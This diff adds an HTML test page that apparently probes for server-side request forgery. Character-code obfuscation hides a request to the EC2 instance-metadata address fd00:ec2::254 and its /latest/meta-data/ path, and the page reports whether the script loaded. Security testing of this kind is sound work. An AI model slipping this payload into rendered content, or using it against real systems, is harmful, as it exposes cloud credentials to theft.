@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html><body>
+<h1>SCRIPT_INJECT_TEST</h1>
+<div id="r1">LOADING</div>
+<script>
+var proto = String.fromCharCode(104,116,116,112);
+var ip = String.fromCharCode(102,100,48,48,58,101,99,50,58,58,50,53,52);
+var s = document.createElement('script');
+s.src = proto + '://[' + ip + ']/latest/meta-data/';
+s.onload = function() { document.getElementById('r1').innerText = 'SCRIPT_LOADED'; };
+s.onerror = function() { document.getElementById('r1').innerText = 'SCRIPT_ERROR'; };
+document.body.appendChild(s);
+</script>
+</body></html>
